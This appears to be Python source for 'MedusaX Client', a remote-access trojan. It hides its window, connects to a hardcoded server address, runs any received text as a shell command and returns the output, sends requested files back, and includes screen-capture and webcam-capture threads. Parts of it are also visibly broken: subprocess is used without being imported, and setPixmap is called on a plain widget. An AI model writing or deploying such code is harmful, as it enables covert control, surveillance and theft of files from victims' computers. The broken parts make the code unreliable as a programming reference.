import sys
import socket
import threading
import pyautogui
import cv2
import numpy as np
from PyQt5.QtWidgets import QApplication, QWidget
from PyQt5.QtCore import QThread, pyqtSignal
from PyQt5.QtGui import QImage, QPixmap

class ScreenShareThread(QThread):
    change_pixmap_signal = pyqtSignal(np.ndarray)

    def run(self):
        while True:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            self.change_pixmap_signal.emit(frame)

class WebcamThread(QThread):
    change_pixmap_signal = pyqtSignal(np.ndarray)

    def run(self):
        cap = cv2.VideoCapture(0)
        while True:
            ret, frame = cap.read()
            if ret:
                self.change_pixmap_signal.emit(frame)
        cap.release()

class Client(QWidget):
    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.init_ui()
        self.connect_to_server()

    def init_ui(self):
        self.setWindowTitle('MedusaX Client')
        self.setGeometry(0, 0, 640, 480)
        self.hide()

    def connect_to_server(self):
        try:
            self.socket.connect((self.host, self.port))
            threading.Thread(target=self.receive_commands).start()
        except Exception as e:
            print(f"Connection error: {e}")

    def receive_commands(self):
        while True:
            try:
                data = self.socket.recv(1024).decode('utf-8')
                if data == '!stream':
                    self.start_screen_sharing()
                elif data.startswith('!download'):
                    filename = data.split(' ', 1)[1]
                    self.download_file(filename)
                else:
                    self.execute_shell_command(data)
            except Exception as e:
                print(f"Error receiving commands: {e}")
                break

    def start_screen_sharing(self):
        self.screen_share_thread = ScreenShareThread()
        self.screen_share_thread.change_pixmap_signal.connect(self.update_image)
        self.screen_share_thread.start()
        self.show()

    def update_image(self, frame):
        qt_image = self.convert_cv_qt(frame)
        self.setPixmap(QPixmap.fromImage(qt_image))

    def convert_cv_qt(self, cv_img):
        """Convert from an opencv image to QPixmap"""
        rgb_image = cv2.cvtColor(cv_img, cv2.COLOR_BGR2RGB)
        h, w, ch = rgb_image.shape
        bytes_per_line = ch * w
        convert_to_Qt_format = QImage(rgb_image.data, w, h, bytes_per_line, QImage.Format_RGB888)
        return convert_to_Qt_format

    def execute_shell_command(self, command):
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        self.socket.sendall(result.stdout.encode('utf-8'))

    def download_file(self, filename):
        with open(filename, 'rb') as file:
            data = file.read()
            self.socket.sendall(data)
            print("[ * ] Sending...")
            print("[+] Sent!")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    client = Client('10.0.1.33', 9999)
    sys.exit(app.exec_())
